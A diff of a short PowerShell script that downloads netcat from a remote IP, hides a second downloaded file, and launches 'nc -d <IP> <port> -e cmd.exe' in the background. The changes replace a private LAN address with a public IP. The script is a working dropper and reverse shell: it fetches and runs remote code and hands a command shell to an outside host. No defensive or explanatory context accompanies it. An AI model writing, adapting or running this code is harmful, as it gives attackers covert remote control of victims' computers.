@@ -1,6 +1,6 @@
 
 # Define the URL and Output Path
-$url = "http://192.168.0.117/nc.exe"  # Replace with the actual URL
+$url = "http://134.184.232.93/nc.exe"  # Replace with the actual URL
 $desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
 $filename = "nc.exe"  # Replace with your desired file path
 $finalPath = Join-Path $desktopPath -ChildPath $filename
@@ -19,7 +19,7 @@ Invoke-WebRequest -Uri $url2 -OutFile $finalPath2
 Set-ItemProperty -Path $finalPath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
 # Define Parameters for Executing the First File
-$params = "-d 192.168.0.117 4444 -e cmd.exe"  # Replace with actual parameters
+$params = "-d 134.184.232.93 1234 -e cmd.exe"  # Replace with actual parameters
 
 # Execute the Downloaded Files
 Start-Process -FilePath $finalPath -ArgumentList $params
